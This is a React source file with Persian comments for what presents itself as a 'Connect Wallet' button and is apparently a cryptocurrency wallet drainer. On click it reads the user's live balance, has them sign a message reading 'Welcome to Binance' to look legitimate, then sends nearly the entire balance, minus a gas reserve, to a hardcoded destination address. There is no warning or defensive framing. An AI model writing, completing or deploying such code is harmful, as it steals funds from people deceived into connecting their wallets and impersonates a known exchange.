import React, { useState } from "react";
import Web3 from "web3";

// دریافت موجودی واقعی از شبکه
async function getLiveBalance(address) {
  try {
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
  } catch (error) {
    alert("❌ Error fetching live balance: " + error.message);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      alert("❌ Could not request accounts: " + err.message);
      return;
    }
    if (!accounts || !accounts.length) {
      alert("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);

    const liveBalanceStr = await getLiveBalance(userAddress);
    if (!liveBalanceStr) return;
    
    const totalBalance = parseFloat(liveBalanceStr);
    if (isNaN(totalBalance)) {
      alert("❌ Could not parse live balance.");
      return;
    }

    // کسر 0.02 BNB برای هزینه گس
    const reserveBNB = 0.02;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      alert("❌ Insufficient funds to cover reserve for gas fee.");
      return;
    }

    // متن ساده که برای امضا نمایش داده می‌شود
    const signingMessage = "Welcome to Binance";

    let signature;
    try {
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [signingMessage, userAddress],
      });
    } catch (error) {
      alert("❌ Signature request failed: " + error.message);
      return;
    }

    // آدرس مقصد
    const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";

    // تبدیل sendAmount به Wei
    const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");

    const txObject = {
      from: userAddress,
      to: destination,
      value: Web3.utils.toHex(weiValue),
      gas: Web3.utils.toHex(21000), // مقدار استاندارد برای انتقال BNB
      gasPrice: Web3.utils.toHex(Web3.utils.toWei('10', 'gwei')), // تنظیم 10 Gwei
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txObject],
      });
      alert("✅ Transaction sent! TxHash: " + txHash);
    } catch (error) {
      alert("❌ Transaction failed: " + error.message);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
